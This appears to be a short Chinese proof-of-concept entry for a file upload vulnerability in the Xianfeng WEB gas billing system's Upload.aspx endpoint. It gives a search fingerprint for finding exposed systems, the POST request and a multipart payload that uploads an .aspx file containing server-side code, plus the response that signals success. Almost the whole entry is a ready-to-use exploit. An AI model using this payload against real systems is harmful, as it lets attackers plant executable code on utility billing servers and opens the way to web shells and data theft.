# 先锋WEB燃气收费系统Upload.aspx文件上传漏洞

先锋WEB燃气收费系统Upload.aspx ｜ 文件上传 ｜ —
- **指纹**：`app="先锋WEB燃气收费系统"`
- **请求**：`POST /AjaxService/Upload.aspx HTTP/1.1`

**Payload**
```
------------GFioQpMK0vv2
Content-Disposition: form-data; name="Fdata"; filename="dudesuite.aspx"
Content-Type: application/octet-stream
<% Response.Write("dudesuite") %>
------------GFioQpMK0vv2
Content-Disposition: form-data; name="submit"
Submin
------------GFioQpMK0vv2--
```
- **响应特征**：200 .aspx